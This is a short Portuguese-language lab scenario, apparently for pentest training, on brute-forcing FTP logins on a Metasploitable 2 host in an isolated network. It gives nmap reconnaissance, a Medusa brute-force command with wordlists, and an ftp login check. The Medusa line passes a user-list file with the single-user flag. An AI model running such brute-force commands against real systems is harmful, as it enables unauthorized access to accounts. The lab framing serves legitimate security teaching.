# Cenário: Força Bruta FTP com Medusa

## Objetivo
Testar resistência de autenticação FTP por força bruta usando Medusa em ambiente isolado.

## Ambiente
- Alvo: `192.168.56.102` (Metasploitable 2)
- Atacante: Kali Linux (`192.168.56.101`)
- Rede: Host-Only (ex.: 192.168.56.0/24)
- Ferramenta: `medusa`
- Wordlist: `wordlists/common-user.txt` | `wordlists/common-pass.txt

## Passos / Comandos
1. Reconhecimento:
```bash
nmap -sV -p 21 192.168.56.102 -oA scans/nmap-ftp
```

2. Força bruta com Medusa:
```bash
medusa -h 192.168.56.102 -u wordlists/common-user.txt -P wordlists/common-pass.txt -M ftp -f -T 6
```

3. Validação:
```bash
ftp 192.168.56.102
```
